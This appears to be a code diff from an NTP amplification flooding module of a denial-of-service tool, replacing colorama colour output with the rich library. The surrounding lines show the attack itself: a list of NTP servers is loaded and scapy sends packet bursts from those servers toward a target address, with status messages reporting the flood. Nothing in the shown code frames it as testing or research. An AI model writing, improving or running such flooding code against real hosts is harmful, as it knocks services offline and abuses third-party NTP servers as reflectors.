@@ -1,9 +1,16 @@
 # Import modules
 import random
-from scapy.all import IP, send, Raw, UDP
 from socket import gaierror
-from colorama import Fore
+from rich.console import Console
 from bin.addons.utils import __path
+from scapy.all import IP, send, Raw, UDP
+
+# Define styled print
+print = Console().print
+red = "red3"
+green = "green1"
+pink = "magenta3"
+yellow = "yellow1"
 
 # Load NTP servers list
 with open(__path("bin", "config", "ntp_servers.txt"), "r") as f:
@@ -27,14 +34,10 @@ def flood(target):
         )
         send(packet, count=packets, verbose=False)
     except gaierror:
-        print(
-            f"{Fore.RED}[!] {Fore.MAGENTA}NTP server {server} is offline!{Fore.RESET}"
-        )
+        print(f"[{red}][!] [{pink}]NTP server {server} is offline![/{red}]")
     except Exception as e:
-        print(
-            f"{Fore.MAGENTA}Error while sending NTP packet\n{Fore.MAGENTA}{e}{Fore.RESET}"
-        )
+        print(f"[{red}]Error while sending NTP packet\n{e}[/{red}]")
     else:
         print(
-            f"{Fore.GREEN}[+] {Fore.YELLOW}Sending {packets} packets from NTP server {server} to {'{}:{}'.format(*target)}.{Fore.RESET}"
+            f"[{green}][+] [{yellow}]Sending {packets} packets from NTP server {server} to {'{}:{}'.format(*target)}.[/{green}]"
         )
